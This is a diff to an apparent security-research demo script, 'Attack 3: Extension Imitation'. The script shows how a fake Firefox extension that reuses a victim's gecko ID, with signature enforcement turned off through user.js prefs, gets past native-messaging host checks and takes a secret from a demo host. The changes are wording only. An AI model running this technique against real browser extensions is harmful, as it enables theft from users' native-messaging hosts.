@@ -39,11 +39,11 @@ GECKODRIVER_PORT = 4445
 def banner():
     print("\n" + "="*65)
     print("  ATTACK 3: EXTENSION IMITATION")
-    print("  Fake extension uses same ID as victim — NM host admits it")
+    print("  Fake extension uses same ID as victim, NM host admits it")
     print("="*65)
 
-def defence(n, msg):
-    print(f"\n  Defence {n}: {msg}")
+def control(n, msg):
+    print(f"\n  Control {n}: {msg}")
 
 def step(n, title):
     print(f"\n  Step {n}: {title}")
@@ -189,12 +189,12 @@ def kill_geckodriver(geckodriver_proc):
 def run_setup():
     banner()
 
-    print("\n  Defences in place:")
-    defence(1, "The NM manifest lists allowed_extensions — Firefox only forwards "
+    print("\n  Controls in place:")
+    control(1, "The NM manifest lists allowed_extensions, Firefox only forwards "
                "connections from the specific demo victim extension ID to this host.")
-    defence(2, "Firefox enforces extension signatures — unsigned extensions cannot "
+    control(2, "Firefox enforces extension signatures, unsigned extensions cannot "
                "be loaded without profile configuration to disable enforcement.")
-    defence(3, "The demo victim host verifies its parent process is Firefox "
+    control(3, "The demo victim host verifies its parent process is Firefox "
                "before responding to any request.")
 
     pause()
@@ -202,7 +202,7 @@ def run_setup():
     # ── Step 1: Extract the victim gecko ID ───────────────────────────────────
     step(1, "Extracting the victim extension's gecko ID")
     info("Firefox extension IDs come from browser_specific_settings.gecko.id")
-    info("in the extension's manifest.json — a fixed, human-readable string.")
+    info("in the extension's manifest.json, a fixed, human-readable string.")
     info("No key derivation required.")
     info("")
     info(f"Reading: {DEMO_EXT}")
@@ -211,7 +211,7 @@ def run_setup():
 
     info(f"Gecko ID: {gecko_id}")
 
-    bypass("Bypassing Defence 1: same gecko ID -> allowed_extensions check passes.")
+    bypass("Bypassing Control 1: same gecko ID -> allowed_extensions check passes.")
 
     pause()
 
@@ -236,9 +236,9 @@ def run_setup():
     info(f"NM manifest written to: {nm_path}")
     info(f"  -> Points to: {real_host_path}")
     info("")
-    info("Headless Firefox spawns the real host — its parent IS Firefox, so the parent check passes.")
+    info("Headless Firefox spawns the real host, its parent IS Firefox, so the parent check passes.")
 
-    bypass("Bypassing Defence 3: headless Firefox IS Firefox — parent check passes.")
+    bypass("Bypassing Control 3: headless Firefox IS Firefox, parent check passes.")
 
     pause()
 
@@ -251,7 +251,7 @@ def run_setup():
     info("Profile user.js disables xpinstall.signatures.required.")
     info("Fake extension installed via geckodriver moz/addon/install endpoint.")
 
-    bypass("Bypassing Defence 2: user.js profile prefs disable signature enforcement.")
+    bypass("Bypassing Control 2: user.js profile prefs disable signature enforcement.")
 
     asyncio.run(run_attack_async(gecko_id, fake_manifest_path))
 
@@ -329,9 +329,9 @@ async def run_attack_async(gecko_id, fake_manifest_path):
                 await asyncio.sleep(2.0)
                 info(f"  Fake extension installed via geckodriver.")
             else:
-                info(f"  WARNING: extension install failed — check geckodriver and Firefox.")
+                info(f"  WARNING: extension install failed, check geckodriver and Firefox.")
         else:
-            info(f"  WARNING: could not create Firefox session — check geckodriver.")
+            info(f"  WARNING: could not create Firefox session, check geckodriver.")
 
         info("")
         info("  Waiting for the fake extension to connect to the real demo victim host...")
@@ -346,7 +346,7 @@ async def run_attack_async(gecko_id, fake_manifest_path):
             elapsed += 0.5
 
         if stolen_secret[0] is None:
-            info(f"  Timed out after {timeout}s — fake extension did not report a secret.")
+            info(f"  Timed out after {timeout}s, fake extension did not report a secret.")
 
     cleanup()
 
